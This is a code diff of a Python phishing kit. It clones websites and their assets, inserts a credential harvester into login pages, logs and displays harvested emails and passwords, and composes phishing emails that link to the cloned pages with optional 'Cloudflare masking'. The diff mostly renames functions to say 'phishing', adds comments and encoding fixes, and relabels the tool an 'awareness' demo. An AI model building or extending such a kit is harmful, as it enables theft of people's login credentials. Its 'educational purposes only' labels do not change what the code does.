@@ -26,6 +26,7 @@ CONFIG = {
 
 def safe_print(message):
     """Print only ASCII characters, ignore everything else"""
+    # Convert to ASCII, replacing non-ASCII with nothing
     ascii_message = message.encode('ascii', 'ignore').decode('ascii')
     print(ascii_message)
 
@@ -41,9 +42,15 @@ def setup_environment():
 
 def clean_html_content(html):
     """Remove ALL non-ASCII and problematic characters from HTML"""
+    # Keep only ASCII characters (0-127)
     html = html.encode('ascii', 'ignore').decode('ascii')
+    
+    # Remove control characters except newline and tab
     html = ''.join(char for char in html if ord(char) >= 32 or char in '\n\r\t')
+    
+    # Remove common problematic patterns
     html = re.sub(r'[\x00-\x1f\x7f-\x9f]', '', html)
+    
     return html
 
 def save_credentials(email, password, source_url):
@@ -79,14 +86,19 @@ def get_url_content(url):
         try:
             response = session.get(url, timeout=CONFIG["timeout"])
             response.raise_for_status()
+
+            # Force UTF-8 encoding
             response.encoding = 'utf-8'
             html = response.text
+            
+            # Clean IMMEDIATELY after getting content
             html = clean_html_content(html)
             return html
         except requests.exceptions.RequestException as e:
             if attempt == CONFIG["max_retries"] - 1:
                 raise
             time.sleep(1)
+
     return None
 
 def download_asset(url, output_path):
@@ -94,14 +106,17 @@ def download_asset(url, output_path):
     try:
         session = requests.Session()
         session.headers.update({'User-Agent': CONFIG["user_agent"]})
+
         response = session.get(url, timeout=CONFIG["timeout"], stream=True)
         response.raise_for_status()
+
         os.makedirs(os.path.dirname(output_path), exist_ok=True)
         with open(output_path, "wb") as f:
             for chunk in response.iter_content(1024):
                 f.write(chunk)
         return True
-    except Exception:
+    except Exception as e:
+        # Don't print asset errors to avoid noise
         return False
 
 def process_assets(soup, base_url, output_dir):
@@ -117,11 +132,15 @@ def process_assets(soup, base_url, output_dir):
             url = element.get(attr)
             if not url or url.startswith(('data:', 'javascript:', 'mailto:', 'tel:')):
                 continue
+
             absolute_url = urljoin(base_url, url)
             filename = os.path.basename(urlparse(absolute_url).path)
+
             if not filename or '.' not in filename:
                 filename = f"asset_{hash(absolute_url)}.bin"
+
             output_path = os.path.join(output_dir, subdir, filename)
+
             if download_asset(absolute_url, output_path):
                 element[attr] = os.path.join(subdir, filename).replace("\\", "/")
 
@@ -135,21 +154,27 @@ def get_list_of_cloned_sites():
                 sites.append(item)
     return sites
 
-def send_email():
-    """Send an email (demo)"""
-    safe_print("\n[EMAIL] Prepare Email")
+def send_phishing_email():
+    """Send a phishing email (educational demo)"""
+    safe_print("\n[EMAIL] Prepare Phishing Email")
+    
     sender = input("[FROM] Sender email: ").strip()
     receiver = input("[TO] Receiver email: ").strip()
     subject = input("[SUBJECT] Subject: ").strip()
     body = input("[BODY] Body (use {url} for link): ").strip()
+    
     use_cloudflare = input("[CLOUDFLARE] Use Cloudflare masking? (y/n): ").strip().lower() == 'y'
+    
     sites = get_list_of_cloned_sites()
+    
     if not sites:
         safe_print("[ERROR] No cloned websites found. Clone a website first (option 1).")
         return
+    
     safe_print("\n[AVAILABLE SITES]")
     for i, site in enumerate(sites, 1):
         safe_print(f"  {i}. {site}")
+    
     try:
         selection = int(input("[SELECT] Choose number: ").strip())
         if selection < 1 or selection > len(sites):
@@ -159,11 +184,14 @@ def send_email():
     except ValueError:
         safe_print("[ERROR] Invalid input.")
         return
+    
     if use_cloudflare:
-        url_name = f"https://secure.localhost:8080.cf/{selected_site}/index.html"
+        phishing_url = f"https://secure.localhost:8080.cf/{selected_site}/index.html"
     else:
-        url_name = f"http://localhost:8000/{selected_site}/index.html"
-    final_body = body.replace("{url}", url_name)
+        phishing_url = f"http://localhost:8000/{selected_site}/index.html"
+    
+    final_body = body.replace("{url}", phishing_url)
+    
     safe_print("\n[EMAIL PREVIEW]")
     safe_print("=" * 50)
     safe_print(f"From: {sender}")
@@ -171,31 +199,38 @@ def send_email():
     safe_print(f"Subject: {subject}")
     safe_print(f"Body:\n{final_body}")
     safe_print("=" * 50)
-    safe_print(f"[URL] {url_name}")
+    safe_print(f"[PHISHING URL] {phishing_url}")
+    
     email_log = {
         "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
         "sender": sender,
         "receiver": receiver,
         "subject": subject,
         "body": final_body,
-        "url": url_name,
+        "phishing_url": phishing_url,
         "cloned_site": selected_site
     }
+    
     try:
         with open(CONFIG["email_log_file"], "r", encoding="utf-8") as f:
             logs = json.load(f)
     except (FileNotFoundError, json.JSONDecodeError):
         logs = []
+    
     logs.append(email_log)
+    
     with open(CONFIG["email_log_file"], "w", encoding="utf-8") as f:
         json.dump(logs, f, indent=4, ensure_ascii=False)
+    
     safe_print("\n[DEMO MODE] Email would be sent via SMTP in production.")
     safe_print("[NOTE] For educational purposes only!")
 
 def clone_website(url):
-    """Clone a website including its assets"""
+    """Clone a website including its assets - FIXED for encoding issues"""
     try:
         safe_print(f"[CLONING] {url}")
+
+        # Create safe directory name (remove special chars)
         domain = urlparse(url).netloc.replace("www.", "")
         domain = re.sub(r'[^a-zA-Z0-9.-]', '_', domain)
         output_dir = os.path.join(CONFIG["cloned_websites_dir"], domain)
@@ -204,22 +239,38 @@ def clone_website(url):
             output_dir = os.path.join(CONFIG["cloned_websites_dir"], f"{domain}_{counter}")
             counter += 1
         os.makedirs(output_dir, exist_ok=True)
+
+        # Create subdirectories
         for subdir in ['css', 'js', 'images', 'media']:
             os.makedirs(os.path.join(output_dir, subdir), exist_ok=True)
+
+        # Get and clean HTML content
         html_content = get_url_content(url)
         if not html_content:
             raise Exception("Failed to fetch HTML content")
+
+        # Parse with BeautifulSoup
         soup = BeautifulSoup(html_content, 'html.parser')
+
+        # Process assets
         process_assets(soup, url, output_dir)
+
+        # Add credential harvester for login pages
         if any(x in url.lower() for x in ['login', 'signin', 'auth', 'account']):
             add_credential_harvester(soup, url)
+
+        # Save HTML
         html_output = str(soup)
         html_output = clean_html_content(html_output)
+
         with open(os.path.join(output_dir, "index.html"), "w", encoding="utf-8", errors='ignore') as f:
             f.write(html_output)
+
         safe_print(f"[SUCCESS] Website saved in: {output_dir}")
         return output_dir
+
     except Exception as e:
+        # Convert error to ASCII-only
         error_msg = str(e)
         clean_error = error_msg.encode('ascii', 'ignore').decode('ascii')
         safe_print(f"[ERROR] Clone failed: {clean_error}")
@@ -262,6 +313,7 @@ def view_harvested_credentials():
     try:
         with open(CONFIG["harvested_credentials_file"], "r", encoding="utf-8") as f:
             credentials = json.load(f)
+
         if not credentials:
             safe_print("No credentials harvested yet.")
         else:
@@ -288,7 +340,7 @@ def main():
 
     while True:
         safe_print("""
-    [CLICK TOOL]
+    [PHISHING AWARENESS TOOL]
     -------------------------
     [1] Clone Website
     [2] Send Email (Demo)
@@ -308,7 +360,7 @@ def main():
                 clone_website(url)
 
             elif choice == "2":
-                send_email()
+                send_phishing_email()
 
             elif choice == "3":
                 view_harvested_credentials()
